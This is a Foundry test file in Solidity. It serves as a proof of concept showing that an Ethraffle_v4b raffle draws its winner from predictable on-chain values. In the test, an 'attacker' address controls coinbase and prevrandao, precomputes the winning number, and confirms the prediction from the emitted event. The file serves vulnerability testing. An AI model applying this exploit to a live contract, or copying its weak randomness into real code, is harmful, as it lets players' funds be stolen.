// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etheraffle.sol";

contract PredictableRandomnessTest is Test {
    Ethraffle_v4b raffle;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address attacker = address(0x31); // Address where uint160 % 50 = 49

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(alice, 50 ether);
        vm.deal(attacker, 50 ether);

        vm.prank(owner);
        raffle = new Ethraffle_v4b();
    }

    function test_AttackerCanPredictWinningNumber() public {
        uint256 pricePerTicket = raffle.pricePerTicket();
        uint256 alicePayment = 49 * pricePerTicket;

        // Alice buys 49 tickets
        vm.prank(alice);
        raffle.buyTickets{value: alicePayment}();

        // Setup predictable environment for attacker's transaction
        vm.coinbase(attacker);
        uint256 fixedPrevrandao = 123456;
        vm.prevrandao(fixedPrevrandao);

        // Precompute expected winning number (mod 50)
        bytes memory packed = abi.encodePacked(attacker, attacker, fixedPrevrandao);
        bytes32 randHash = keccak256(packed);
        uint256 expectedWinningNumber = uint256(randHash) % 50;

        // Record events to verify raffle outcome
        vm.recordLogs();
        vm.prank(attacker);
        raffle.buyTickets{value: pricePerTicket}(); // Buys 50th ticket and triggers raffle

        // Verify predictable outcome from event
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 eventSig = keccak256("RaffleResult(uint256,uint256,address,address,address,uint256,bytes32)");
        bool found;
        uint256 winningNumber;

        for (uint256 i; i < entries.length; i++) {
            if (entries[i].topics[0] == eventSig) {
                (, winningNumber, , , , , ) =
                    abi.decode(
                        entries[i].data,
                        (uint256, uint256, address, address, address, uint256, bytes32)
                    );
                found = true;
                break;
            }
        }
        require(found, "RaffleResult event not found");
        assertEq(winningNumber, expectedWinningNumber, "Winning number should match prediction");

        // Final vulnerability verdict
        console.log("Vulnerability Exists: Randomness is predictable - attacker succeeded through event verification");
    }
}